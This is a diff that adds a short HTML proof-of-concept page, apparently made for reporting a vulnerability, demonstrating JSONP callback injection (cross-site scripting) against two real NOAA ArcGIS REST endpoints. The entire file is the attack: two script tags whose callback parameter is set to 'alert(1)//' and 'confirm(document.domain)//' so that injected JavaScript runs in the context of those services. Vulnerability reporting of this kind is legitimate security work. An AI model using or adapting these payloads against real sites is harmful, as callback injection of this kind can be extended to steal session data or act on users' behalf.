@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head><title>JSONP XSS PoC — noaa.gov ArcGIS</title></head>
+<body>
+<p>If this page shows a dialog, the JSONP callback injection executed.</p>
+<script src="https://gis.ngdc.noaa.gov/arcgis/rest/services/bag_hillshades/ImageServer?f=json&callback=alert(1)//"></script>
+<script src="https://imagery.coast.noaa.gov/arcgis/rest/services?f=json&callback=confirm(document.domain)//"></script>
+</body>
+</html>
